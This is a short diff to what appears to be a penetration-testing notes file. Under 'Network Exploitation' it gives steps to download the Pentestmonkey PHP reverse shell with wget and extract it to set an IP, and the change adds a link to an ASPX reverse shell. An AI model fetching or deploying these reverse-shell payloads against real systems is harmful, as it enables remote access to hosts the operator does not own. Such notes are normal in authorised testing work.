@@ -585,6 +585,9 @@ a. Network Exploitation
 		
 			1. Download PHP payload from: Pentestmonkey
 			wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+
+			ASPX Reverse Shell:
+			https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
 			
 			2. extract the file & modify the IP sources: 
 			tar-xvzf php-reverse-shell-1.0.tar.gz
